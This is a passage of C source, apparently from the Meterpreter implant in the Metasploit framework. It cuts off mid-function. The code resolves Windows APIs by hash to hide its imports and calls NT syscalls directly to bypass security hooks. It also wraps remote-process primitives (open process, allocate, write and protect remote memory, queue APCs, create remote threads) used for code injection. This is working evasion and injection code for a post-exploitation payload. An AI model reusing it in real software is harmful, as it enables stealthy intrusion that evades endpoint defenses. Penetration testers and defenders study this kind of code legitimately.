#ifndef _METERPRETER_WINAPI_C
#define _METERPRETER_WINAPI_C
#include "winapi.h"

#include "../ReflectiveDLLInjection/dll/src/DirectSyscall.h"
#include "common.h"

#define KERNEL32_DLL "kernel32.dll"
#define NTDLL_DLL "ntdll.dll"
#define ADVAPI32_DLL "advapi32.dll"
#define CRYPT32_DLL "crypt32.dll"
#define USER32_DLL "user32.dll"
#define WS2_32_DLL "ws2_32.dll"
#define RPCRT4_DLL "rpcrt4.dll"
#define WINHTTP_DLL "winhttp.dll"
#define WININET_DLL "wininet.dll"

typedef struct NtDllFunction {
    LPCSTR lpFunctionName;
    DWORD dwNumberOfArgs;
    DWORD dwCryptedHash; // _hash of lpFunctionName
} NtDllFunction;


enum NtDllSyscall {
    ZwAllocateVirtualMemory,
    ZwOpenProcess,
    ZwWriteVirtualMemory,
    ZwReadVirtualMemory,
    ZwProtectVirtualMemory,
    ZwQueryVirtualMemory,
    ZwFreeVirtualMemory,
    ZwQueryInformationProcess,
    ZwQueryObject,
    ZwQueryInformationWorkerFactory,
    ZwSetInformationWorkerFactory,
    ZwSetIoCompletion,
    ZwMapViewOfSection,
    ZwCreateSection,
    ZwOpenSection,
    ZwOpenFile,
    ZwQueryAttributesFile,
    ZwClose,
    ZwLockVirtualMemory
};

enum HashedFunctions {
    H_ZwAllocateVirtualMemory = 0xD33D4AED,
    H_ZwOpenProcess = 0xF0D09D60,
    H_ZwWriteVirtualMemory = 0xC5D0A4C2,
    H_ZwReadVirtualMemory = 0x3DEFA5C2,
    H_ZwProtectVirtualMemory = 0xBC3F4D89,
    H_ZwQueryVirtualMemory = 0x4FD39C92,
    H_ZwFreeVirtualMemory = 0xDE63B5C3,
    H_NtQueueApcThread = 0x52E9A746,
    H_NtOpenThread = 0x59651E8C,
    H_RtlGetVersion = 0xD0C1869C,
    H_WriteProcessMemory = 0xD83D6AA1,
    H_ReadProcessMemory = 0x579D1BE9,
    H_OpenProcess = 0xEFE297C0,
    H_VirtualAlloc = 0x91AFCA54,
    H_VirtualAllocEx = 0x6E1A959C,
    H_VirtualProtect = 0x7946C61B,
    H_VirtualProtectEx = 0x53D98756,
    H_VirtualQuery = 0xA3C8C8AA,
    H_VirtualQueryEx = 0xF45A2B20,
    H_VirtualFree = 0x30633AC,
    H_VirtualFreeEx = 0xC3B4EB78,
    H_CreateRemoteThread = 0x72BD9CDD,
    H_CloseHandle = 0xFFD97FB,
    H_DuplicateHandle = 0xBD566724,
    H_CreateToolhelp32Snapshot = 0xE454DFED,
    H_Thread32First = 0xB83BB6EA,
    H_OpenThread = 0x58C91E6F,
    H_SuspendThread = 0xE8C2CDC,
    H_Thread32Next = 0x86FED608,
    H_ResumeThread = 0x9E4A3F88,
    H_FreeLibrary = 0x4DC9D5A0,
    H_FlushInstructionCache = 0x53120980,
    H_LocalFree = 0x5CBAEAF6,
    H_CreateFileA = 0x7C0017A5,
    H_WriteFile = 0xE80A791F,
    H_LoadLibraryA = 0xEC0E4E8E,
    H_WaitForMultipleObjects = 0x23EAD524,
    H_SetHandleInformation = 0x7F9E1144,
    H_GlobalFree = 0x7CB922F6,
    H_CreateNamedPipeA = 0xB2D6846,
    H_ConnectNamedPipe = 0xCB09C9F9,
    H_GetOverlappedResult = 0xC087DCE8,
    H_ReadFile = 0x10FA6516,
    H_CreateThread = 0xCA2BD06B,
    H_ResetEvent = 0x560B084F,
    H_SetThreadErrorMode = 0x5922C47C,
    H_OpenProcessToken = 0x591EA70F,
    H_AdjustTokenPrivileges = 0x24488A0F,
    H_ImpersonateLoggedOnUser = 0x6D821B37,
    H_CryptDuplicateKey = 0x738BCBF6,
    H_CryptSetKeyParam = 0x180E1DA8,
    H_CryptDecrypt = 0x59202584,
    H_CryptGenRandom = 0x4AABDD73,
    H_CryptEncrypt = 0xD9242588,
    H_CryptDestroyKey = 0x95E24580,
    H_CryptReleaseContext = 0x5AE8E894,
    H_CryptImportKey = 0xD864E84D,
    H_OpenThreadToken = 0x8D91EA66,
    H_AllocateAndInitializeSid = 0x5BDCE983,
    H_SetEntriesInAclW = 0xB142E54,
    H_InitializeAcl = 0xF8AF61AB,
    H_InitializeSecurityDescriptor = 0x230EA37F,
    H_SetSecurityDescriptorDacl = 0x534E5FC2,
    H_SetSecurityDescriptorSacl = 0x714E5FC2,
    H_LookupPrivilegeValueW = 0x97E8C2B8,
    H_CryptDecodeObjectEx = 0x22BA7198,
    H_CryptImportPublicKeyInfo = 0x35A052E0,
    H_CertGetCertificateContextProperty = 0x481F9127,
    H_GetUserObjectInformationA = 0x11EFCB2B,
    H_GetThreadDesktop = 0x56641B89,
    H_WSAStartup = 0x3BFCEDCB,
    H_socket = 0x492F0B6E,
    H_connect = 0x60AAF9EC,
    H_accept = 0x498649E5,
    H_setsockopt = 0xC055F2EC,
    H_recv = 0xE71819B6,
    H_WSADuplicateSocketA = 0x5DCA3BD3,
    H_InternetOpenW = 0x57E8443F,
    H_InternetConnectW = 0x1E4BE824,
    H_HttpOpenRequestW = 0xF7DE76B5,
    H_InternetSetOptionW = 0xF5EFA023,
    H_HttpSendRequestW = 0x2DE6BEB3,
    H_HttpQueryInfoW = 0xFB2F4610,
    H_InternetReadFile = 0x5FE34B8B,
    H_InternetCloseHandle = 0xFA9B69C7,
    H_InternetCrackUrlW = 0xA5955290,
    H_UuidCreate = 0xC439EDE7,
    H_WinHttpOpen = 0xD1026DBE,
    H_WinHttpConnect = 0x8AAE8F,
    H_WinHttpOpenRequest = 0x8F34E1C1,
    H_WinHttpGetIEProxyConfigForCurrentUser = 0xA206024C,
    H_WinHttpGetProxyForUrl = 0x88DD3F88,
    H_WinHttpSetOption = 0xD83C501E,
    H_WinHttpSendRequest = 0x98348882,
    H_WinHttpReceiveResponse = 0xDE22845E,
    H_WinHttpQueryHeaders = 0x4F8B3B75,
    H_WinHttpReadData = 0xB24F660F,
    H_WinHttpQueryOption = 0xDB0FB31,
    H_WinHttpCrackUrl = 0x73513B,
};

NtDllFunction lpFunctionsTobeLoaded[] = {
    {.lpFunctionName = NULL /* ZwAllocateVirtualMemory */, .dwNumberOfArgs = 6, .dwCryptedHash = H_ZwAllocateVirtualMemory},
    {.lpFunctionName = NULL /* ZwOpenProcess */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwOpenProcess},
    {.lpFunctionName = NULL /* ZwWriteVirtualMemory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwWriteVirtualMemory},
    {.lpFunctionName = NULL /* ZwReadVirtualMemory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwReadVirtualMemory},
    {.lpFunctionName = NULL /* ZwProtectVirtualMemory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwProtectVirtualMemory},
    {.lpFunctionName = NULL /* ZwQueryVirtualMemory */, .dwNumberOfArgs = 6, .dwCryptedHash = H_ZwQueryVirtualMemory},
    {.lpFunctionName = NULL /* ZwFreeVirtualMemory */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwFreeVirtualMemory},
    {.lpFunctionName = NULL /* ZwQueryInformationProcess */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwQueryInformationProcess},
    {.lpFunctionName = NULL /* ZwQueryObject */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwQueryObject},
    {.lpFunctionName = NULL /* ZwQueryInformationWorkerFactory */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwQueryInformationWorkerFactory},
    {.lpFunctionName = NULL /* ZwSetInformationWorkerFactory */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwSetInformationWorkerFactory},
    {.lpFunctionName = NULL /* ZwSetIoCompletion */, .dwNumberOfArgs = 5, .dwCryptedHash = H_ZwSetIoCompletion},
    {.lpFunctionName = NULL /* ZwMapViewOfSection */, .dwNumberOfArgs = 10, .dwCryptedHash = H_ZwMapViewOfSection},
    {.lpFunctionName = NULL /* ZwCreateSection */, .dwNumberOfArgs = 7, .dwCryptedHash = H_ZwCreateSection},
    {.lpFunctionName = NULL /* ZwOpenSection */, .dwNumberOfArgs = 3, .dwCryptedHash = H_ZwOpenSection},
    {.lpFunctionName = NULL /* ZwOpenFile */, .dwNumberOfArgs = 6, .dwCryptedHash = H_ZwOpenFile},
    {.lpFunctionName = NULL /* ZwQueryAttributesFile */, .dwNumberOfArgs = 2, .dwCryptedHash = H_ZwQueryAttributesFile},
    {.lpFunctionName = NULL /* ZwClose */, .dwNumberOfArgs = 1, .dwCryptedHash = H_ZwClose},
    {.lpFunctionName = NULL /* ZwLockVirtualMemory */, .dwNumberOfArgs = 4, .dwCryptedHash = H_ZwLockVirtualMemory},};

#define STATUS_SUCCESS 0
Syscall** lpWinApiSyscalls = NULL;

extern NTSTATUS SyscallStub(Syscall *pSyscall, DWORD dwNumberOfArgs, ULONG_PTR *lpArgs);

DWORD GetWindowsMajorMinVer() {
    DWORD dwResult = 0;
    OSVERSIONINFOEXW os = {0};
    os.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);

    NTSTATUS status = winapi_ntdll_RtlGetVersion(&os);
    if(status != STATUS_SUCCESS) {
        dprintf("[WINAPI][GetWindowsMajorMinVer] RtlGetVersion returned %p", status);
        return 0;
    }
    dwResult = (os.dwMajorVersion << 8 & 0xff00) | (os.dwMinorVersion & 0xff);
    return dwResult; 
}

Syscall** GetOrInitWinApiSyscalls() {
    if (lpWinApiSyscalls == NULL) {
        BOOL bError = FALSE;
        HANDLE hHeap = GetProcessHeap();
        bError = hHeap == NULL;
        DWORD dwNumbOfSyscalls = sizeof(lpFunctionsTobeLoaded) / sizeof(NtDllFunction);
        Syscall* lpSyscall = NULL;
        if (!bError) {
            lpWinApiSyscalls = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall*) * dwNumbOfSyscalls);
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpWinApiSyscalls = %p", lpWinApiSyscalls);
            bError = lpWinApiSyscalls == NULL;
        }
        if (!bError) {
            for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                lpSyscall = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, sizeof(Syscall));
                bError = lpSyscall == NULL;
                if (bError) {
                    break;
                }
                if(lpFunctionsTobeLoaded[i].lpFunctionName != NULL) {
                    lpSyscall->dwCryptedHash = _hash((char*)lpFunctionsTobeLoaded[i].lpFunctionName);
                } else {
                    lpSyscall->dwCryptedHash = lpFunctionsTobeLoaded[i].dwCryptedHash;
                }
                lpSyscall->dwNumberOfArgs = lpFunctionsTobeLoaded[i].dwNumberOfArgs;
                lpWinApiSyscalls[i] = lpSyscall;
                dprintf("[WINAPI][GetOrInitWinApiSyscalls] lpSyscall = %p; dwCryptedHash = %p", lpSyscall, lpSyscall->dwCryptedHash);
            }
        }
        if (!bError) {
            bError = !getSyscalls(GetModuleHandleA(NTDLL_DLL), lpWinApiSyscalls, dwNumbOfSyscalls);
            if (!bError) {
                for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                    dprintf("[WINAPI][GetOrInitWinApiSyscalls] Index: %d pStub: %p, dwSyscallNr: %d", i, lpWinApiSyscalls[i]->pStub, lpWinApiSyscalls[i]->dwSyscallNr);
                }
            }
        }
        if (bError) {
            dprintf("[WINAPI][GetOrInitWinApiSyscalls] Error creating Syscall structure.");
            if (lpWinApiSyscalls != NULL) {
                for (DWORD i = 0; i < dwNumbOfSyscalls; i++) {
                    lpSyscall = lpWinApiSyscalls[i];
                    if (lpSyscall != NULL) {
                        HeapFree(hHeap, 0, lpSyscall);
                    }
                }
                HeapFree(hHeap, 0, lpWinApiSyscalls);
                lpWinApiSyscalls = NULL;
            }
        }
    }

    return lpWinApiSyscalls;
}

BOOL hasDirectSyscallSupport() {
    DWORD dwVersion = GetWindowsMajorMinVer();
    DWORD dwMajor = (dwVersion & 0xff00) >> 8;
    DWORD dwMinor = dwVersion & 0xff;
    if(dwVersion != 0 && (dwMajor >= 6 && dwMinor >= 1)) {
        if(lpWinApiSyscalls == NULL) {
            GetOrInitWinApiSyscalls();
        }
        return lpWinApiSyscalls != NULL;
    }
    return FALSE;
}


// Disable Spectre mitigation warning for this sensitive, low-level code.
#if _MSC_VER >= 1914
#pragma warning(disable : 5045) // warning C5045: Compiler will insert Spectre mitigation for memory load if /Qspectre switch specified
#endif

FARPROC WINAPI GetProcAddressH(HANDLE hModule, DWORD dwFunctionHash)
{
	if (!hModule)
		return NULL;

	UINT_PTR uiLibraryAddress = (UINT_PTR)hModule;
	PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)uiLibraryAddress;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_EXPORT_DIRECTORY pExportDirectory = NULL;

	// STEP 1: Validate the PE headers to ensure we are parsing a valid module.
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return NULL;

	pNtHeaders = (PIMAGE_NT_HEADERS)(uiLibraryAddress + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return NULL;

	// STEP 2: Locate the Export Address Table (EAT). If the module has no exports, return NULL.
	PIMAGE_DATA_DIRECTORY pDataDirectory = &pNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
	if (pDataDirectory->VirtualAddress == 0)
		return NULL;

	DWORD dwExportDirRva = pDataDirectory->VirtualAddress;
	DWORD dwExportDirSize = pDataDirectory->Size;
	pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(uiLibraryAddress + dwExportDirRva);

	// STEP 3: Get pointers to the three critical arrays within the EAT.
	// AddressOfFunctions: RVAs to the actual function code.
	PDWORD pdwAddressArray = (PDWORD)(uiLibraryAddress + pExportDirectory->AddressOfFunctions);
	// AddressOfNames: RVAs to the function name strings.
	PDWORD pdwNameArray = (PDWORD)(uiLibraryAddress + pExportDirectory->AddressOfNames);
	// AddressOfNameOrdinals: An array of WORDs that maps names to ordinals.
	PWORD pwNameOrdinals = (PWORD)(uiLibraryAddress + pExportDirectory->AddressOfNameOrdinals);
    // ---- IMPORT BY NAME ----
    // Iterate through the array of exported function names.
    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++)
    {
        LPCSTR cpExportedFunctionName = (LPCSTR)(uiLibraryAddress + pdwNameArray[i]);

        // Perform a case-sensitive string comparison to find a match.
        if (_hash((char *)cpExportedFunctionName) == dwFunctionHash)
        {
            // Match found. The index 'i' is the key to link the three arrays.
            // Use 'i' to get the function's ordinal from the name ordinals array.
            WORD wFunctionOrdinal = pwNameOrdinals[i];

            // Use the ordinal to get the function's RVA from the address table.
            DWORD dwFunctionRva = pdwAddressArray[wFunctionOrdinal];

            // This should not happen for a named export, but as a safeguard.
            if (dwFunctionRva == 0)
                return NULL;

            // Forwarder detection: if the RVA falls inside the export directory,
            // the "address" is actually a forwarder string of the form
            // "TargetDll.TargetFunction" (or ".#Ordinal"). We must resolve it in
            // the target DLL rather than returning the string as a function.
            if (dwFunctionRva >= dwExportDirRva && dwFunctionRva < (dwExportDirRva + dwExportDirSize))
            {
                LPCSTR cpForwarder = (LPCSTR)(uiLibraryAddress + dwFunctionRva);
                CHAR szDllName[64] = { 0 };
                DWORD dwDot = 0;
                while (cpForwarder[dwDot] && cpForwarder[dwDot] != '.') dwDot++;
                if (cpForwarder[dwDot] != '.' || dwDot == 0 || dwDot + 5 > sizeof(szDllName)) {
                    return NULL;
                }
                for (DWORD k = 0; k < dwDot; k++) szDllName[k] = cpForwarder[k];
                // Append ".dll" so LoadLibrary/GetModuleHandle find it.
                szDllName[dwDot + 0] = '.';
                szDllName[dwDot + 1] = 'd';
                szDllName[dwDot + 2] = 'l';
                szDllName[dwDot + 3] = 'l';
                szDllName[dwDot + 4] = 0;

                HMODULE hFwdModule = GetModuleHandleA(szDllName);
                if (hFwdModule == NULL) {
                    hFwdModule = LoadLibraryA(szDllName);
                }
                if (hFwdModule == NULL) {
                    return NULL;
                }
                // Resolve by re-hashing the target function name (everything after '.').
                DWORD dwFwdHash = _hash((char *)(cpForwarder + dwDot + 1));
                return GetProcAddressH(hFwdModule, dwFwdHash);
            }

            // Return the absolute address of the function.
            return (FARPROC)(uiLibraryAddress + dwFunctionRva);
        }
	}

	// The requested function was not found in the export table.
	return NULL;
}

void* GetFunctionH(LPCSTR lpModuleName, DWORD dwFunctionHash) {
    HMODULE hModule = NULL;
    FARPROC lpOutput = NULL;
    hModule = GetModuleHandleA(lpModuleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(lpModuleName);
    }
    if (hModule != NULL) {
        lpOutput = GetProcAddressH(hModule, dwFunctionHash);
    }
    if (hModule == NULL) {
        dprintf("[WINAPI][GetFunctionH] Unable to find or load '%s' module.", lpModuleName);
    }
    if (lpOutput == NULL) {
        dprintf("[WINAPI][GetFunctionH] Unable to find function's address (Hash: %p).", dwFunctionHash);
    }
    return lpOutput;
}

void* GetFunction(LPCSTR lpModuleName, LPCSTR lpFunctionName) {
    HMODULE hModule = NULL;
    FARPROC lpOutput = NULL;
    hModule = GetModuleHandleA(lpModuleName);
    if (hModule == NULL) {
        hModule = LoadLibraryA(lpModuleName);
    }
    if (hModule != NULL) {
        lpOutput = GetProcAddress(hModule, lpFunctionName);
    }
    if (hModule == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find or load '%s' module.", lpModuleName);
    }
    if (lpOutput == NULL) {
        dprintf("[WINAPI][GetFunction] Unable to find '%s' function's address.", lpFunctionName);
    }
    return lpOutput;
}

// START: ntdll.dll

NTSTATUS winapi_ntdll_ZwAllocateVirtualMemory(HANDLE hProcess, PVOID* pBaseAddress, ULONG_PTR pZeroBits, PSIZE_T pRegionSize, ULONG ulAllocationType, ULONG ulProtect) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)hProcess, (ULONG_PTR)pBaseAddress, (ULONG_PTR)pZeroBits, (ULONG_PTR)pRegionSize, (ULONG_PTR)ulAllocationType, (ULONG_PTR)ulProtect };
    return SyscallStub(lpWinApiSyscalls[ZwAllocateVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)DesiredAccess, (ULONG_PTR)ObjectAttributes, (ULONG_PTR)ClientId };
    return SyscallStub(lpWinApiSyscalls[ZwOpenProcess], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToWrite, PULONG NumberOfBytesWritten) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)Buffer, (ULONG_PTR)NumberOfBytesToWrite, (ULONG_PTR)NumberOfBytesWritten };
    return SyscallStub(lpWinApiSyscalls[ZwWriteVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, ULONG NumberOfBytesToRead, PULONG NumberOfBytesRead) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)Buffer, (ULONG_PTR)NumberOfBytesToRead, (ULONG_PTR)NumberOfBytesRead };
    return SyscallStub(lpWinApiSyscalls[ZwReadVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)RegionSize, (ULONG_PTR)NewProtect, (ULONG_PTR)OldProtect };
    return SyscallStub(lpWinApiSyscalls[ZwProtectVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwQueryVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, MEMORY_INFORMATION_CLASS MemoryInformationClass, PVOID MemoryInformation, SIZE_T MemoryInformationLength, PSIZE_T ReturnLength) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)MemoryInformationClass, (ULONG_PTR)MemoryInformation, (ULONG_PTR)MemoryInformationLength, (ULONG_PTR)ReturnLength };
    return SyscallStub(lpWinApiSyscalls[ZwQueryVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG FreeType) {
    ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)BaseAddress, (ULONG_PTR)RegionSize, (ULONG_PTR)FreeType };
    return SyscallStub(lpWinApiSyscalls[ZwFreeVirtualMemory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
}

NTSTATUS winapi_ntdll_ZwQueueApcThread(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext, PVOID Argument1, PVOID Argument2) {
    NTSTATUS (NTAPI *pZwQueueApcThread)(HANDLE ThreadHandle, PVOID ApcRoutine, PVOID ApcContext, PVOID Argument1, PVOID Argument2) = GetFunctionH(NTDLL_DLL, H_ZwQueueApcThread);
    dprintf("[WINAPI][winapi_ntdll_ZwQueueApcThread] Calling ZwQueueApcThread @ %p", pZwQueueApcThread);
    if (pZwQueueApcThread) {
        return pZwQueueApcThread(ThreadHandle, ApcRoutine, ApcContext, Argument1, Argument2);
    }
    return 0xC0000001;  // STATUS_UNSUCCESSFUL
}

NTSTATUS winapi_ntdll_ZwOpenThread(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) {
    NTSTATUS (NTAPI *pZwOpenThread)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) = GetFunctionH(NTDLL_DLL, H_ZwOpenThread);
    dprintf("[WINAPI][winapi_ntdll_ZwOpenThread] Calling ZwOpenThread @ %p", pZwOpenThread);
    if (pZwOpenThread) {
        return pZwOpenThread(ThreadHandle, DesiredAccess, ObjectAttributes, ClientId);
    }
    return 0xC0000001; // STATUS_UNSUCCESSFUL
}

NTSTATUS winapi_ntdll_RtlGetVersion(PRTL_OSVERSIONINFOEXW os) {
    NTSTATUS (NTAPI *pRtlGetVersion)(PRTL_OSVERSIONINFOEXW os) = GetFunctionH(NTDLL_DLL, H_RtlGetVersion);
    dprintf("[WINAPI][winapi_ntdll_RtlGetVersion] Calling RtlGetVersion @ %p", pRtlGetVersion);
    if(pRtlGetVersion) {
        return pRtlGetVersion(os);
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryInformationProcess(HANDLE ProcessHandle, INT ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)ProcessHandle, (ULONG_PTR)ProcessInformationClass, (ULONG_PTR)ProcessInformation, (ULONG_PTR)ProcessInformationLength, (ULONG_PTR)ReturnLength };
        return SyscallStub(lpWinApiSyscalls[ZwQueryInformationProcess], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryInformationProcess)(HANDLE, INT, PVOID, ULONG, PULONG) = GetFunctionH(NTDLL_DLL, H_ZwQueryInformationProcess);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryInformationProcess] Calling ZwQueryInformationProcess @ %p", pZwQueryInformationProcess);
        if (pZwQueryInformationProcess) {
            return pZwQueryInformationProcess(ProcessHandle, ProcessInformationClass, ProcessInformation, ProcessInformationLength, ReturnLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryObject(HANDLE Handle, INT ObjectInformationClass, PVOID ObjectInformation, ULONG ObjectInformationLength, PULONG ReturnLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)Handle, (ULONG_PTR)ObjectInformationClass, (ULONG_PTR)ObjectInformation, (ULONG_PTR)ObjectInformationLength, (ULONG_PTR)ReturnLength };
        return SyscallStub(lpWinApiSyscalls[ZwQueryObject], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryObject)(HANDLE, INT, PVOID, ULONG, PULONG) = GetFunctionH(NTDLL_DLL, H_ZwQueryObject);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryObject] Calling ZwQueryObject @ %p", pZwQueryObject);
        if (pZwQueryObject) {
            return pZwQueryObject(Handle, ObjectInformationClass, ObjectInformation, ObjectInformationLength, ReturnLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwQueryInformationWorkerFactory(HANDLE WorkerFactoryHandle, INT WorkerFactoryInformationClass, PVOID WorkerFactoryInformation, ULONG WorkerFactoryInformationLength, PULONG ReturnLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)WorkerFactoryHandle, (ULONG_PTR)WorkerFactoryInformationClass, (ULONG_PTR)WorkerFactoryInformation, (ULONG_PTR)WorkerFactoryInformationLength, (ULONG_PTR)ReturnLength };
        return SyscallStub(lpWinApiSyscalls[ZwQueryInformationWorkerFactory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwQueryInformationWorkerFactory)(HANDLE, INT, PVOID, ULONG, PULONG) = GetFunctionH(NTDLL_DLL, H_ZwQueryInformationWorkerFactory);
        dprintf("[WINAPI][winapi_ntdll_ZwQueryInformationWorkerFactory] Calling ZwQueryInformationWorkerFactory @ %p", pZwQueryInformationWorkerFactory);
        if (pZwQueryInformationWorkerFactory) {
            return pZwQueryInformationWorkerFactory(WorkerFactoryHandle, WorkerFactoryInformationClass, WorkerFactoryInformation, WorkerFactoryInformationLength, ReturnLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwSetInformationWorkerFactory(HANDLE WorkerFactoryHandle, INT WorkerFactoryInformationClass, PVOID WorkerFactoryInformation, ULONG WorkerFactoryInformationLength) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)WorkerFactoryHandle, (ULONG_PTR)WorkerFactoryInformationClass, (ULONG_PTR)WorkerFactoryInformation, (ULONG_PTR)WorkerFactoryInformationLength };
        return SyscallStub(lpWinApiSyscalls[ZwSetInformationWorkerFactory], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwSetInformationWorkerFactory)(HANDLE, INT, PVOID, ULONG) = GetFunctionH(NTDLL_DLL, H_ZwSetInformationWorkerFactory);
        dprintf("[WINAPI][winapi_ntdll_ZwSetInformationWorkerFactory] Calling ZwSetInformationWorkerFactory @ %p", pZwSetInformationWorkerFactory);
        if (pZwSetInformationWorkerFactory) {
            return pZwSetInformationWorkerFactory(WorkerFactoryHandle, WorkerFactoryInformationClass, WorkerFactoryInformation, WorkerFactoryInformationLength);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_ZwSetIoCompletion(HANDLE IoCompletionHandle, PVOID KeyContext, PVOID ApcContext, NTSTATUS IoStatus, ULONG_PTR IoStatusInformation) {
    if (hasDirectSyscallSupport()) {
        ULONG_PTR lpArgs[] = { (ULONG_PTR)IoCompletionHandle, (ULONG_PTR)KeyContext, (ULONG_PTR)ApcContext, (ULONG_PTR)IoStatus, (ULONG_PTR)IoStatusInformation };
        return SyscallStub(lpWinApiSyscalls[ZwSetIoCompletion], sizeof(lpArgs) / sizeof(ULONG_PTR), (ULONG_PTR *)&lpArgs);
    } else {
        NTSTATUS (NTAPI *pZwSetIoCompletion)(HANDLE, PVOID, PVOID, NTSTATUS, ULONG_PTR) = GetFunctionH(NTDLL_DLL, H_ZwSetIoCompletion);
        dprintf("[WINAPI][winapi_ntdll_ZwSetIoCompletion] Calling ZwSetIoCompletion @ %p", pZwSetIoCompletion);
        if (pZwSetIoCompletion) {
            return pZwSetIoCompletion(IoCompletionHandle, KeyContext, ApcContext, IoStatus, IoStatusInformation);
        }
    }
    return 0xC0000001;
}

NTSTATUS winapi_ntdll_RtlCreateUserThread(HANDLE ProcessHandle, PVOID SecurityDescriptor, BOOL CreateSuspended, ULONG StackZeroBits, SIZE_T StackReserve, SIZE_T StackCommit, PVOID StartAddress, PVOID StartParameter, PHANDLE ThreadHandle, PVOID ClientId) {
    NTSTATUS (NTAPI *pRtlCreateUserThread)(HANDLE, PVOID, BOOL, ULONG, SIZE_T, SIZE_T, PVOID, PVOID, PHANDLE, PVOID) = GetFunctionH(NTDLL_DLL, H_RtlCreateUserThread);
    dprintf("[WINAPI][winapi_ntdll_RtlCreateUserThread] Calling RtlCreateUserThread @ %p", pRtlCreateUserThread);
